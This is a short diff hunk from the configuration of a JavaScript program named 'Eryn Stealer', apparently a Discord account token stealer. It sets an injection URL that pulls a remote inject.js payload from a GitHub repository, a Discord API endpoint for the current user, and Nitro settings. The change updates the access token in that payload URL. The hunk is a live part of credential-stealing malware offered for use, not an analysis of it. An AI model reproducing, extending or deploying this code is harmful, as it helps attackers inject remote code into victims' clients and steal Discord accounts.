@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Eryn Stealer', 
   embed_icon: ''.replace(/ /g, '%20'), 
   embed_color: 3447704, 
-  injection_url: 'https://raw.githubusercontent.com/Emny6/apiinjectionlblalbla/main/inject.js?token=GHSAT0AAAAAABVNWNLL7OC5MLTRKNYVVB3QYVWGCIQ', 
+  injection_url: 'https://raw.githubusercontent.com/Emny6/apiinjectionlblalbla/main/inject.js?token=GHSAT0AAAAAABVNWNLLJG7RWF56QBN45K7IYVWMUNQ', 
  
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
